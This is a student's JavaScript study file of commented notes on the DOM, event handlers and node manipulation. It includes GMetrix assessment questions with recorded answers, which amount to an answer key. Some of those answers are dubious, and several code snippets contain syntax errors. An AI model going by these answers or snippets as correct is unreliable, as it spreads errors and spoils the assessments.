But they do remind you of which properties you can access through the DOM node for that element.
On a PC, go to Tools (or More Tools) and select Developer Tools, or right-click on any element and select Inspect Element.
Select Elements from the menu that runs across the top of this tool.
The source of the page will be shown on the left and several other options to the right.
Any element that has child elements has an arrow next to it that lets you expand and collapse the item to show and hide its content.
The Properties panel (on the right) tells you the type of object the selected element is (in some versions of Chrome this is shown as a tab).
When you highlight different elements in the main left-hand window, you can see the values in the Properties panel on the right reflect that element.

	EXAMINING THE DOM IN FIREFOX
Firefox has similar built-in tools, but you can also download a DOM inspector tool that shows the text nodes.
Firefox also has a 3D view of the DOM, where a box is drawn around each element, and you can change the angle of the page to show which parts of it stick out more
than others.
The further they protrude, the further into child elements they appear.
This can give you an interesting (and quick) glimpse into the complexity of the markup used on a page and the depth to which elements are nested.
If you search online for "DOM Inspector", you will find the tool designed for Firefox shown on the left.
In the screen shot, you can see a similar tree view to the one shown in Chrome, but it also shows you where there are whitespace nodes (shown as #text).
In the panel to the right, you can see the value in the nodes; whitespace nodes have no value in this panel.
Another FIrefox extension worth trying is called Firebug.
*/

/*
	EXAMPLE DOCUMENT OBJECT MODEL
	This example brings together a selection of the techniques you have seen throughout the chapter to update the contents of the list.
	It has three main aims:
		1. Add a new item to the start and end of the list:
				Adding an item to the start of a list requires the use of a	different method than adding an element to the end of the list.
		2. Set a class attribute on all items:
				This involves looping through each of the <li> elements, and updating the value of the class attribute to cool.
		3. Add the number of list items to the heading.
	This involves four steps:
		1. Reading the content of the heading
		2. Counting the number of <li> elements in the page
		3. Adding the number of items to the content of the heading
		4. Updating the heading with this new content
			JAVASCRIPT    c05/js/example.js
			var list = document.getElementsByTagName('ul')[0];
			var newItemLast = document.createElement('li');
			var newTextLast = document.createTextNode('cream');
			newItemLast.appendChild(newTextLast);
			list.appendChild(newItemLast);
			var newItemFirst = document.createElement('li');
			var newTextFirst = document.createTextNode('kale');
			newItemFirst.appendChild(newTextFirst);            
			list.insertBefore(newItemFirst, list.firstChild);
	This part of the example adds two new list items to the <ul> element: one to the end of the list, and one to the start of it.
	The technique used here is DOM manipulation and there are four steps to	creating a new element node and adding it to the DOM tree:
		1. Create the element node
		2. Create the text node
		3. Add the text node to the element node
		4. Add the element to the DOM tree
	To achieve step four, you must first specify the parent that will contain the new node, in both cases, this is the <ul> element.
	The node for this element is stored in a variable called list, because it is used many times.
	The appendChild() method adds new nodes as a child of the parent element.
	It has one parameter: the new content to be added to the DOM tree.
	If the parent element already has child elements, it will be added after the last of these (and will therefore be the last child of the parent element).
		parent.appendChild(newItem);
	(You have seen this method used several times, both to add new elements to the tree, and to add text nodes to element nodes).
	To add the item to the start of the list, the insertBefore() method is used.
	This requires one extra piece of information: the element you want to add the new content before (the target element).
		parent.insertBefore(newItem, target);
			JAVASCRIPT   c05/js/example.js
			var listItems = document.querySelectorAll('li');
			var i;
			for(i = 0; i < listItems.length; i++)
			{               
				listItems[i].className = 'cool';                      
			}
			var heading = document.querySelector('h2');            
			var headingText = heading.firstChild.nodeValue;        
			var totalItems = listItems.length;                     
			var newHeading =  headingText + '<span>' + totalItems + '</span>';
			heading.textContent = newHeading;
	The next step of this example is to loop through all of the elements in	the list and update the value of their class attributes, setting them to cool.
	This is achieved by first collecting all of the list item elements and storing them in a variable called listItems.
	A for loop is then used to go through each of them in turn.
	In order to tell how many times the loop should run, you use the length	property.
	Finally, the code updates the heading to include the number of list	items.
	It updates it using the innerHTML property as opposed to the DOM manipulation techniques used earlier in the script.
	This demonstrates how you can add to the content of an existing element	by reading its current value and adding to it.
	You could use a similar technique if you needed to add a value to an attribute - without overwriting its existing value.
	To update the heading with the number of items in the list, you need two pieces of information:
		1. The original content of the heading, so that you can add the number of list items to it, collected using the nodeValue property (although innerHTML or
		   textContent would do the same).
		2. The number of list items, which can be found using the length property on the listItems variable.
		With this information ready, there are two steps to updating the content of the <h2> element:
			1. Creating the new heading and storing it in a variable - the new heading will be made up of the original heading content, followed by the number of
			   items in the list.
			2. Updating the heading, which is done by updating the content of the heading element using the innerText property of that node.
*/

/*
	SUMMARY: DOCUMENT OBJECT MODEL
The browser represents the page using a DOM tree.
DOM trees have four types of nodes:
	document nodes, element nodes, attribute nodes, and text nodes.
You can select element nodes by their id or class attributes, by tag name, or using CSS selector syntax.
Whenever a DOM query can return more than one node, it will always return a NodeList.
From an element node, you can access and update its content using properties such as textContent and innerHTML, or using DOM manipulation techniques.
An element node can contain multiple text nodes and child elements that are siblings of each other.
In older browsers, implementation of the DOM is inconsistent (and is a popular reason for using jQuery).
Browsers offer tools for viewing the DOM tree.
*/

/*
GMetrix:
	DOM Pre-Assessment:
	Q1: A window object represents which item?
			Browser window
	Q2: What popular event handler can be added to JavaScript DOM events?
			onclick
	Q3: The getElementsByClassName method is used to determine which item?
			Whether changing class attributes will have a major impact on the look of a website.
	Q4: The onchange event executes when a(n) _ is changed.
			Object
				The onchange event is typically used when a user needs an immediate reaction to something changing.
	Q5: The innerHTML property is used for which reason?
			Allows the user to control text dynamically in between the opening and closing tags of an existing HTML element.
	Q6: Which best defines what an onmouseout event accomplishes?
			It triggers an action when a mouse is moved away from an object.
*/

/*
	DOM Videos:
		DOM Tree:
			Window:
				DOM (Document Object Model)
					1. Help to get an understanding of this model.
					2. How objects on a webpage relate to each other.
					3. How we can use this to learn about objects and their properties.
					The first object we are going to look at is the	window, which represents a browser window:
						Window
							Properties: URL, name and specs
					A DOM always starts with a window object.
						function checkoutWindow()
						{
							checkWin = window.open("checkout.htm", "", "width=300, height=300");
						}
			Document:
				Window
					Properties: URL, name and specs
				Document
					<html>
					<head>
						<meta /> <title></title> <link />
					</head>
					<body>
						<section id="main">
						<section id="main-content">
						<header></header>
					</body>
					</html>
*/

/*
			HTML Events:
				onchange:
					Object properties do not just change by themselves, methods do not just run by themselves.
					An interaction such as a mouse click, a key press, an object changing values, or a webpage loading.
						<p>
							<input type="number" id="practiceHours()" name="Practice Hours:" onchange="getPracticeHours();" />
						</p>
				onmouseover:
					<section id="thumbnails">
						<article class="itemthumbnail">
							<a href="" onmouseover="mouseOverPic(mandolin);">
								<img src="images/mandolin.jpg" alt="Mandolin" />
							</a>
						</article>
					</section>
					<script src="scripts/main.js">
						function mouseOverPic(product)
						{
							document.getElementById('itemImage').src = "images\\" + product.imgsrc + ".jpg";
						}
					In main.js:
						const salesTaxRate = .075;
						incMsg = "This site is under construction and will be fully functional soon.";
						function product(item, description, price, imgsrc)
						{
							this.item = item;
							this.description = description;
							this.price = price;
							this.imgsrc = imgsrc;
						}
				onload:
					<body onload="alert("This is an example of the onload event.");">
						<section id="main">
							<section id="main_content">
								<header>
									<div id="sitelogo">
										<a href="index.html">
											<img src="images/logo.png" alt="Mandolin" />
										</a>
									</div>
									<div id="headerInfo">
										<p>&nbsp;</p>
										<p>Call now:<span style="font-size: 1.5em;">800.555.3839</span></p>
									</div>
								</header>
					</body>
				onclick:
					<body>
						<div class="itemquantity">
							<p>
								<input type="text" value="1" id="manqty" /> <br/>
								<button id="manqtyadd" onclick="addOne('manqty');"> + </button>
								<button id="manqtysubtract" onclick="javascript: document.getElementById('manqty').value--;"> -	</button>
								<button id="manqtyzero" onclick="javascript: document.getElementById('manqty').value = 0;"> Clear </button>
								<button id="manqtyadd" onclick="addFive('manqty');"> Add Five </button>
							</p>
						</div>
						<div class="order_buttons">
							<p>
								<input type="button" class="buttons" value="Update Cart" onclick="javascript: document.getElementById('subtotal').innerHTML
								 = parseFloat(document.getElementById('mantotal').innerHTML) + parseFloat(document.getElementById('drumtotal').innerHTML)
								 + parseFloat(document.getElementById('tromtotal').innerHTML);
							</p>
						</div>
					</body>
				onmouseout:
					<body>
						<div class="order_buttons">
							<p>
								<input type="button" class="buttons" value="Update Cart" onclick="updateCart()";
								 onmouseout="document.getElementById('cartMsg')".innerHTML = 'Click the Update Cart button to get the latest order total.'; />
							</p>
						</div>
					</body>
				onkeydown:
					<body>
						<div class="itemquantity">
							<p>
								<input type="text" value="1" id="manqty" onkeydown="alert('It may be easier to use buttons to change this field.');" /> <br/>
								<button id="manqtyadd" onclick="addOne('manqty');">	+ </button>
								<button id="manqtysubtract" onclick="javascript: document.getElementById('manqty').value--;"> -	</button>
								<button id="manqtyzero" onclick="javascript: document.getElementById('manqty').value = 0;">	Clear </button>
								<button id="manqtyadd" onclick="addFive('manqty');"> Add Five </button>
							</p>
						</div>
						<div class="order_buttons">
							<p>
								<input type="button" class="buttons" value="Update Cart" onclick="updateCart()";
								 onmouseout="document.getElementById('cartMsg')".innerHTML = 'Click the Update Cart button to get the latest order total.'; />
							</p>
						</div>
					</body>
*/

/*
		Output to HTML Documents:
			innerHTML:
				document.getElementById('practiceHours').innerHTML = msg1.concat(msg2, msg3) + '<br/>' + msg4.concat(msg5, msg6, msg7);
			document.write:
				function checkoutWindow()
				{
					checkWin = window.open("checkout.htm", "", "width=300, height=300, status=no");
					checkWin.document.write("<p>This document is current as of: " + Date());
				}

		Locate, Modify and Add Elements:
			getElementById:
				function mouseOverPic(product)
				{
					document.getElementById('itemImage').src = "images\\" + product.imgsrc + ".jpg";
					document.getElementById('itemName').innerHTML = product.item;
					document.getElementById('itemDescription').innerHTML = product.description;
					document.getElementById('itemPrice').innerHTML = product.price.toFixed(2);
				}
			getElementsByTagName:
				<script>
					function getImages()
					{
						var imgList = document.getElementsByTagName("img");
						for(var i = 0; i < imgList.length; i++)
						{
							document.getElementById('output').innerHTML += "<br/>" + imgList[i].src;
						}
					}
				</script>
			getElementsByClassName:
				<script>
					function getClasses()
					{
						var classList = document.getElementsByClassName("social");
						document.getElementById('output').innerHTML += "<br/>" + classList.length;
					}
				</script>
			setAttribute:
				<body>
					<h1>Comparisons</h1>
					<input type="button" class="buttons" value="Change Heading" onclick="setAltHeadingClass();" />
					<script>
						function setAltHeadingClass()
						{
							document.getElementsByTagName("h1")[0].setAttribute("class", "altheading");
						}
					</script>
				</body>
				In style.css:
				.altheading
				{
					font-size: 20pt;
					text-align: center;
					background-color: lightcyan;
				}
			createElement:
				<input type="button" class="buttons" value="Create Element" onclick="addConstructionMsg();" />
				 function addConstructionMsg()
				 {
					var constructionP = document.createElement("p");
					var constructionText = document.createTextNode("This page is under construction.") + ("We're not comparing right now.");
					constructionP.appendChild(constructionText);
					document.getElementById('sitelogo').appendChild(constructionP);
				 }

			Event Handlers and Listeners:
				<head>
					<meta charset="utf-8" />
					<title>The Music Store</title>
					<link rel="stylesheet" type="text/css href="styles/style.css" />
				</head>
				<body onload="document.getElementById('output').innerHTML = '';">
					<input type="button" class="buttons" value="Get Images" onclick="getImages();" />
					<input type="button" class="buttons" value="Get Social Classes" onclick="getClasses();" />
					<input type="button" class="buttons" value="Change Heading" onclick="setAltHeadingClass();" />
					<input type="button" class="buttons" value="Create Element" onclick="addConstructionMsg();" />
					<input type="button" id="getDate" class="buttons" value="Get the current date" />
					<script>
						document.getElementById('getDate').addEventListener("click", getCurrentDate);
					</script>
				</body>
				</html>
*/

/*
		Exam Tips:
		Know where pieces fit in the Document Object Model (DOM):
			Everything stems downward from the document object.
		Know the differences among the HTML events that have been covered and when to use each HTML event:
			onchange, onmouseover, onload, onclick, onmouseout, onkeydown.
		Remember that innerHTML is a property that works on an existing HTML element.
		Remember that document.write method dynamically writes elements and text to a webpage.
		Working dynamically with elements and attributes, and know when to use each type:
			Know the differences among getElementById, getElementsByTagName and getElementsByClassName.
			Know how to use the setAttribute and createElement methods.
*/

/*
	DOM Exercise Labs:
	Q1: Using the drag and drop method, drag each entry to the empty positions in order to complete the DOM.
			The section tag should be above the header tag:
				<body>
					<section id="main">
					<section id="main_content">
					<header>
				</body>
	
	Q2: Using the drag and drop method, drag each entry to its correct position in the code sample in order to apply the onmouseover function:
			function mouseOverPic(product)
				
	Q3: Use the dropdown list to accurately complete the code sample in order to apply the onload event using an alert:
			<body onload="alert('This is an example of the onload event.');">
				<section id="main"></section>
			</body>

	Q4: Use the dropdown lists to accurately complete the code sample in order to append the innerHTML properties:
			function lessonSchedule()
			{
				var lessonStartDate = new Date('October 2, 2017 06:00:00 PM');
				var lessonEndDate = new Date(lessonStartDate);
				var detailsSchedule = document.getElementById('lessonSchedule')
				lessonEndDate.setDate(lessonEndDate.getDate() + 0);

				detailsSchedule.innerHTML += "<br/> First lesson: " + lessonStartDate.toLocaleDateString() + "<br/> Subseque

				do
				{
					lessonStartDate.setDate(lessonStartDate.getDate() + 7);
					detailsSchedule.innerHTML += "<br/>" + lessonStartDate;
				}
				while(lessonStartDate < lessonEndDate)
			}

	Q5: Use the dropdown lists to accurately complete the code sample in order to apply the getElementsByClassName method:
			function getClasses()
			{
				var classList = document.getElementsByClassName("social");
				document.getElementById('output').innerHTML	+= "<br/>" + classList.length;
			}
*/

/*
	DOM Post-Assessment:
	Q1: Using the drag and drop method, drag each entry to its correct position in the code sample in order to apply the onmouseover function:
			function mouseOverPic(product)
		
	Q2: Which lines are used to apply an onchange event?
			15-16
			<input type="number" id="practiceHours()" name="Practice Hours:" onchange="getPracticeHours();" />

	Q3: Using the drag and drop method, drag each entry to the empty positions in order to complete the DOM.
			The section tag should be above the header tag:
				<body>
					<section id="main">
					<section id="main_content">
					<header>
				</body>

	Q4: Use the dropdown list to accurately complete the code sample in order to apply the onload event using an alert:
			<body onload="alert('This is an example of the onload event.');">
				<section id="main"></section>
			</body>

	Q5: The createElement method allows the user to dynamically create an element and place that element in a specific spot on a webpage, as long as the element
		has a(n) _.
				ID.

	Q6: On which two lines in the code example are there onclick events that call functions?
			69 & 72
				<div class="itemquantity">
					<p>
						<input type="text" value="1" id="manqty" onkeydown="alert('It may be easier to use buttons to change this field.');" /> <br/>
						<button id="manqtyadd" onclick="addOne('manqty');"> + </button>
						<button id="manqtysubtract" onclick="javascript: document.getElementById('manqty').value--;"> -	</button>
						<button id="manqtyzero" onclick="javascript: document.getElementById('manqty').value = 0;">	Clear </button>
						<button id="manqtyadd" onclick="addFive('manqty');"> Add Five </button>
					</p>
				</div>

	Q7: An onkeydown event should be applied to which line of code in the code sample?
			69
			<input type="text" value="1" id="manqty" onkeydown="alert('It may be easier to use buttons to change this field.');" />

	Q8: Which three HTML elements can be found in a head tag?
			meta, title, link

	Q9: Use the dropdown lists to accurately complete the code sample in order to apply the getElementsByClassName method:
			function getClasses()
			{
				var classList = document.getElementsByClassName("social");
				document.getElementById('output').innerHTML += "<br/>" + classList.length;
			}

	Q10: Which function is tied to the setAttribute method?
			setAltHeadingClass()
			{
				document.getElementsByTagName("h1")[0].setAttribute("class", "altheading");
			}

	Q11: Which are the three properties of a window object?
			URL, Name, Specs

	Q12: Which is a best practice for JavaScript users in relation to the getElementById method?
			Have a consistent naming convention for the IDs of elements.

	Q13: A user adds an event listener to a line of code. What function is coupled with the click event?
			<script>
				document.getElementById('getDate').addEventListener("click", getCurrentDate);
			</script>
				getCurrentDate.

	Q14: The document.write method is used to write which two items to a webpage?
			HTML elements & text.

	Q15: Which is a true statement about a document object?
			Every HTML element and attribute descends from the document object.

	Q16: Which part of the onmouseout event is the method?
			<input type="button" class="buttons" value="Update Cart" onclick="updateCart()"; onmouseout="document.getElementById('cartMsg')".innerHTML
						= 'Click the Update Cart button to get the latest order total.'; />
				getElementById

	Q17: Use the dropdown lists to accurately complete the code sample in order to append the innerHTML properties:
			function lessonSchedule()
			{
				var lessonStartDate = new Date('October 2, 2017 06:00:00 PM');
				var lessonEndDate = new Date(lessonStartDate);
				var detailsSchedule = document.getElementById('lessonSchedule')
				lessonEndDate.setDate(lessonEndDate.getDate() + 0);

				detailsSchedule.innerHTML += "<br/> First lesson: " + lessonStartDate.toLocaleDateString() + "<br/> Subseque

				do
				{
					lessonStartDate.setDate(lessonStartDate.getDate() + 7);
					detailsSchedule.innerHTML += "<br/>" + lessonStartDate;
				}
				while(lessonStartDate < lessonEndDate)
			}

	Q18: Which lines represent the for loop attached to the getElementsByTagName method?
			for(var i = 0; i < imgList.length; i++)
			{
				document.getElementById('output').innerHTML += "<br/>" + imgList[i];
			}
				69-71
*/

/*
Video Tutorials:
	What is the Document Object Model (DOM)?
		The DOM is a representation of the HTML structure of the web page.
		We need to have a basic understanding of the DOM so that we can	understand how to navigate the web page.
		You can quickly and easily have a working knowledge of the DOM in no time at all.
							 document
								|
							root element:
							  <html>
							   _|_
			element:							  element:
			<head>								   <body>
			   |									 _|_
			element:	attribute:	  <-	element:	 element:
			<title>		  "href"			   <a>		   <h1>
			   |								|			|
			 text:							 text:		   text:
			"My Title"						"My Link"	"My Heading"

		What is most important is that you learn how to reference the elements of a web page so that you can manipulate them using JavaScript.

		The Element Node:		The Text, Attribute Comment Nodes:
		"Document Node"
			<html>
		<head>
			<title>				"Welcome to the site!!!"
		<body>
			<div>
				<p>				"This is in the first paragraph."
				<p>				"This is in the second paragraph."
*/

/*
	Understanding the Document Object Model (DOM):
		<!DOCTYPE html>								<!--Document Node-->
		<html lang="en">							<!--Root Element Node-->
		<head>										<!--Element Node-->
			<meta charset="utf-8" />
			<meta name="viewport" content="width=device-width, initial-scale=1.0" />
			<meta http-equiv="X-UA-Compatible" content="ie=edge" />
			<title>Document</title>
		</head>
		<body>
			<h1>Header</h1>
			<ul>
				<li>One</li>
				<li>Two</li>
				<li>Three</li>
			</ul>
			<!--<button onclick="alert('Hi!');">Click Me!</button>-->
			<!--<button onclick="console.log('Hi in the console!');">Click Me!</button>-->
			<!--<button onclick="clickHandler('from the button click event!');">Click Me!</button>-->
			<button id="myButton">Click Me!</button>
			<script type="text/javascript" src="domintro.js"></script>
			<!--
			<script>
				// Script tags at the end of the HTML page is best, it ensures the code above is loaded & processed & ready for JavaScript.
				// Don't write JavaScript in your HTML pages, write JavaScript in an external .js file.
				function clickHandler(message)
				{
					console.log('Hi... ' + message);
				}
			</script>
			-->
		</body>
		</html>

		In domintro.js:
			(
			function()
			{
				function clickHandler(message)
				{
					console.log('Hi... ' + message);
				}
				let myButton = document.getElementById('myButton');										// get a reference to myButton
				myButton.addEventListener('click', function() { clickHandler('Hi from iife!') } );
			}
			)
			();
*/

/*
	Demonstration of Attaching an Event Handler to an Event:
		Example #1:
			<!DOCTYPE html>
			<html>
			<head>
				<title>Attaching Event Handlers</title>
			</head>
			<body>
				<h4>Click the button for an alert dialog box and some text!</h4>
				<button onclick="addText()" onclick="alertMe()">Click Me!</button> <br/>
				<p id="textArea"></p>
				<script>
					function alertMe()
					{
						alert("Hi - I am the Alert!");
					}
					function addText()
					{
						document.getElementById("textArea").innerHTML = "The New Text is Here!";
					}
				</script>
				// The first onclick event always takes precedence above all. 

		Example #2:
			<!DOCTYPE html>
			<html>
			<head>
				<title>Attaching Event Handlers</title>
			</head>
			<body>
				<h4>Click the button for an alert dialog box and some text!</h4>
				<button id="newButton">Click Me!</button> <br/>
				<p id="textArea"></p>
				<script> 
					// This will add the functions to act as event listeners to the button's click events.
					document.getElementById("newButton").addEventListener("click", alertMe);
					document.getElementById("newButton").addEventListener("click", addText);
					function alertMe()
					{
						alert("Hi - I am the Alert!");
					}
					function addText()
					{
						document.getElementById("textArea").innerHTML = "The New Text is Here!";
					}
				</script>
*/

/*
Interactive Course Material:
	JavaScript: Working with the DOM & Events
		An Introduction to Retrieving DOM Elements:
			DOMElementsHtmlCss.html:
				<!DOCTYPE html>
				<html>
				<head>
					<meta charset="utf-8" />
				</head>
				<body>
					<h2>DOM Elements, HTML and CSS</h2>
					<p id="jstitle">JavaScript</p>
					<b>Finding HTML element using the tag name</b>
					<p id="jstext"><i>JavaScript is <b>very</b> easy to<b>learn</b></i></p>
					<i class="jsdescription">JavaScript is a programming language.</i>
					<h2 id="jsstyled" style="color:red">JavaScript</h2>
					<button type="button" onclick="document.getElementById('jsstyled').style.color='green'">Click Me!</button>
					<script src="DOMElementsHtmlCss.js"></script>
				</body>
				</html>
			
			DOMElementsHtmlCss.js
				"use strict";
				var language = document.getElementById('jstitle');
				console.log("The contents of jstitle: ", language.innerHTML);

				var bTags = document.getElementsByTagName('b');
				console.log("\nAll the <b> tags in the document: ", bTags);
				console.log("The first <b> tag: ", bTags[0].innerHTML);

				var pTags = document.getElementsByTagName('p');
				console.log("\nThe number of <p> tags: ", pTags.length);

				var jstext = document.getElementById('jstext');
				var jstextbTags = jstext.getElementsByTagName('b');
				console.log("\nListing the <b> tags in jstext: ", jstextbTags);
*/

/*
		Modifying the DOM of a Web Page:
				DOMElementsHtmlCss.js
				"use strict";
				var jstext = document.getElementById('jstext');

				var jstextbTags = jstext.getElementsByTagName('b');
				console.log("\nListing the <b> tags in jstext: ", jstextbTags);

				var jsdesc = document.getElementsByClassName('jsdescription');
				console.log("\nThe innerHTML of the first jsdescription element: ", jsdesc[0].innerHTML);

				var select = document.querySelectorAll("i.jsdescription");
				console.log("\nUsing the CSS selector i.jsdescription: ", select[0].innerHTML;

				var data = document.getElementById('jstitle');
				console.log("\nModifying the innerHTML of an element: ")
				console.log("Old data: ", data.innerHTML;

				var newData = data.innerHTML = "Programming with JS";
				console.log("New data: ", newData);
*/

/*
		Accessing the Child Nodes of a DOM Element:
				Nodes.html
				<!DOCTYPE html>
				<html>
				<head>
					<meta charset="utf-8" />
				</head>
				<body>
					<h2>Nodes</h2>
					<b>Manipulating the DOM</b>
					<p id="jstitle">JavaScript</p>
					<p id="jsdescription">JavaScript is <i>easy</i> to learn</p>
					<ul id="unOrder">
						<li>Python</li>
					</ul>
					<script src="Nodes.js"></script>
				</body>
				</html>

				Nodes.js
				"use strict";
				var jsDescription = document.getElementById('jsdescription');
				console.log("Accessing text using innerHTML for jsdescription: ", jsDescription.innerHTML);

				console.log("Accessing childNodes: ", jsDescription.childNodes);

				console.log("Accessing firstChild.nodeValue: ", jsDescription.firstChild.nodeValue);
				console.log("Accessing lastChild.nodeValue: ", jsDescription.lastChild.nodeValue);

				console.log("Accessing childNodes[1].firstChild.nodeValue: ", jsDescription.childNodes[1].firstChild.nodeValue;

				console.log("document.nodeValue: ", document.nodeValue);

				var jstitle = document.getElementById('jstitle');
				console.log("jstitle.nodeName: ", jstitle.nodeName);
				console.log("document.nodeName: ", document.nodeName);

				console.log("The nodeTypes for the different nodes: ");
				console.log("The document: ", document.nodeType);
				console.log("Element node(id=jstitle): ", jstitle.nodeType);
				console.log("Text node (firstChild of an element): ", jstitle.firstChild.nodeType);
*/

/*
		Adding Nodes to the DOM:
				Nodes.js
				"use strict";

				var unorderedList = document.getElementById('unOrder');
				var listItem1 = document.createElement('li');

				console.log("Creating new elements");
				console.log("The first li element: ", listItem1);

				listItem1.textContent = "JavaScript";
				console.log("The first li element with textContent: ", listItem1);

				var listItem2 = document.createElement('li');
				var text2 = document.createTextNode("Java");
				listItem2.appendChild(text2);

				console.log("The second li element: ", listItem2);

				unorderedList.prepend(listItem1);
				unorderedList.append(listItem2);

				var h4 = document.createElement('h4');
				h4.textContent = "This is a list of useful programming languages:";
				document.body.insertBefore(h4, unorderedList);

				h4.style.backgroundColor = "cyan";

				var h3 = document.createElement('h3');
				h3.textContent = "This marks the end of the unordered list.";
				document.body.insertBefore(h3, unorderedList.nextSibling);

				Nodes.html
				<!DOCTYPE html>
				<html>
				<head>
					<meta charset="utf-8" />
				</head>
				<body>
					<h2>Nodes</h2>
					<b>Manipulating the DOM</b>
					<p id="jstitle">JavaScript</p>
					<p id="jsdescription">_</p>
					<h4 style="background-color: cyan;">This is a list of useful programming languages:</h4>
					<ul id="unOrder">
						<li>JavaScript</li>
						<li>Python</li>
						<li>Java</li>
					</ul>
					<h3>This marks the end of the unordered list</h3>
					<script src="Nodes.js"></script>
				</body>
				</html>
*/

/*
		Removing and Replacing Nodes in the DOM:
				Nodes.js
				"use strict";

				var unorderedList = document.getElementById('unOrder');
				var listItem1 = document.createElement('li');

				console.log("Creating new elements");
				console.log("The first li element: ", listItem1);

				listItem1.textContent = "JavaScript";
				console.log("The first li element with textContent: ", listItem1);

				var listItem2 = document.createElement('li');
				var text2 = document.createTextNode("Java");
				listItem2.appendChild(text2);

				console.log("The second li element: ", listItem2);

				unorderedList.prepend(listItem1);
				unorderedList.append(listItem2);

				var h4 = document.createElement('h4');
				h4.textContent = "This is a list of useful programming languages:";
				document.body.insertBefore(h4, unorderedList);

				h4.style.backgroundColor = "cyan";

				var h3 = document.createElement('h3');
				h3.textContent = "This marks the end of the unordered list.";
				document.body.insertBefore(h3, unorderedList.nextSibling);

				jstitle = document.getElementById('jstitle');
				jstitle.remove();

				var listItem = unorderedList.firstElementChild;
				unorderedList.removeChild(listItem);

				var listItem3 = document.createElement('li');
				listItem3.textContent = "Go";
				unorderedList.replaceChild(listItem3, listItem2);

				Nodes.html
				<!DOCTYPE html>
				<html>
				<head>
					<meta charset="utf-8" />
				</head>
				<body>
					<h2>Nodes</h2>
					<b>Manipulating the DOM</b>
					<p id="jsdescription">_</p>
					<h4 style="background-color: cyan;">This is a list of useful programming languages:</h4>
					<ul id="unOrder">
						<li>Python</li>
						<li>Go</li>
					</ul>
					<h3>This marks the end of the unordered list</h3>
					<script src="Nodes.js"></script>
				</body>
				</html>
*/

/*
		Generating an Animation with JavaScript:
				Animations.html
				<!DOCTYPE html>
				<html>
				<head>
					<meta charset="utf-8" />
				</head>
				<body>
					<h2>Animations</h2>
					<style>
						#square
						{
							width: 500px;
							height: 500px;
							position: relative;
							background: yellow;
						}
						#circle
						{
							width: 50px;
							height: 50px;
							position: absolute;
							background: red;
							border-radius: 50%;
							top: 450px;
						}
					</style>
					<div id="square">
						<div id="circle" style="top: 0px; right: 0px;"></div>
					</div>
					<script src="Animations.js"></script>
					<p>
						<button onclick="animation()">Move!</button>
					</p>
				</body>
				</html>

				Animations.js
				"use strict";
				function animation()
				{
					var dot = document.getElementById("circle");
					var loc = 450;
					var time = setInterval(frame, 10);
					function frame()
					{
						if(loc == 0)
						{
							clearInterval(time);
						}
						else
						{
							loc--;
							dot.style.top = loc + "px";
							dot.style.right = loc + "px";
						}
					}
				}
*/

/*
		An Introduction to Event Handling:
				IntroToEventHandlers.js
				"use strict";
				var incCount = 0;
				var decCount = 0;
				window.onload - function()
				{
					var incButton = document.getElementById("incButton");
					var decButton = document.getElementById("decButton");
					decButton.onclick = countDec;
					incButton.onclick = function()
					{
						incCount++;
						var incCountMessage = document.getElementById("incCount");
						incCountMessage.innerHTML = "Increment counter = " + incCount;
					}
					var incDecValue = function()
					{
						alert("incDecValue ! Incremented value count = " + incCount + " , Decremented value count = " + decCount);
					}
					statusButton.addEventListener("click", incDecValue);
				}
				function countDec()
				{
					decCount--;
					var decCountMessage = document.getElementById("decCount");
					decCountMessage.innerHTML = "Decrement counter = " + decCount;
				}

				IntroToEventHandlers.html
				<!DOCTYPE html>
				<html>
				<head>
					<meta charset="utf-8" />
				</head>
				<body>
					<h2>Multiple Event Handlers</h2>
					<script src="IntroToEventHandlers.js"></script>
					<button id="incButton">Increment</button>
					<button id="decButton">Decrement</button>
					<button id="statusButton">Status</button>
					<div id="incCount">Increment counter = 4</div>
					<div id="decCount">Decrement counter = -4</div>
				</body>
				</html>
*/

/*
		Event Handlers for Clicks and Input:
				MultipleEventHandlers.html
				<!DOCTYPE html>
				<html>
				<head>
					<meta charset="utf-8" />
				</head>
				<body>
					<h2>Multiple Event Handlers</h2>
					<script src="MultipleEventHandlers.js"></script>
					<button id="time">To get the time, click me!</button>
					<p id="currenttime"></p>
					<hr/> <br/>
					Press Enter to convert into UPPERCASE: <br/>
					Enter a word:
					<input type="text" id="convert" />
					<hr/> <br/>
					<div id="mouse" style="background-color: pink; width: 120px; height: 10px; padding: 40px;">
						 Mouse Over Me!
					</div>
					<hr/> <br/>
					Click on the image and hold for some time...! <br/>
					<img id="image" src="images/wifi-off.png" width="100" height="180" />
				</body>
				</html>
				
				MultipleEventHandlers.js
				"use strict";
				window.onload = function()
				{
					time.onclick = displayDate;
					convert.onchange = convertIntoUppercase;
					convert.onfocus = onFocus;
				}
				function displayDate()
				{
					currenttime.innerHTML = Date();
				}
				function convertIntoUppercase()
				{
					var uppercase = document.getElementById("convert");
					uppercase.value = uppercase.value.toUpperCase();
				}
				function onFocus()
				{
					var focus = document.getElementById("convert");
					focus.style.background = "yellow";
				}
*/

/*
		Event Handlers for Mouse Events:
				MultipleEventHandlers.html
				<!DOCTYPE html>
				<html>
				<head>
					<meta charset="utf-8" />
				</head>
				<body>
					<h2>Multiple Event Handlers</h2>
					<script src="MultipleEventHandlers.js"></script>
					<button id="time">To get the time, click me!</button>
					<p id="currenttime"></p>
					<hr/> <br/>
					Press Enter to convert into UPPERCASE: <br/>
					Enter a word:
					<input type="text" id="convert" />
					<hr/> <br/>
					<div id="mouse" style="background-color: pink; width: 120px; height: 10px; padding: 40px;">
						 Mouse Over Me!
					</div>
					<hr/> <br/>
					Click on the image and hold for some time...! <br/>
					<img id="image" src="images/wifi-off.png" width="100" height="180" />
				</body>
				</html>
				
				MultipleEventHandlers.js
				"use strict";
				window.onload = function()
				{
					time.onclick = displayDate;
					convert.onchange = convertIntoUppercase;
					convert.onfocus = onFocus;
					mouse.onmouseover = mouseOver;
					mouse.onmouseout = mouseOut;
					image.onmousedown = wifiOn;
					image.onmouseup = wifiOff;
				}
				function displayDate()
				{
					currenttime.innerHTML = Date();
				}
				function convertIntoUppercase()
				{
					var uppercase = document.getElementById("convert");
					uppercase.value = uppercase.value.toUpperCase();
				}
				function onFocus()
				{
					var focus = document.getElementById("convert");
					focus.style.background = "yellow";
				}
				function mouseOver()
				{
					var mouseover = document.getElementById("mouse");
					mouseover.style.backgroundColor = "green";
					mouseover.innerHTML = "Thank You";
				}
				function mouseOut()
				{
					var mouseout = document.getElementById("mouse");
					mouseout.style.backgroundColor = "cyan";
					mouseout.innerHTML = "Mouse over me...!";
				}
				function wifiOn()
				{
					var wifi_on = document.getElementById("image");
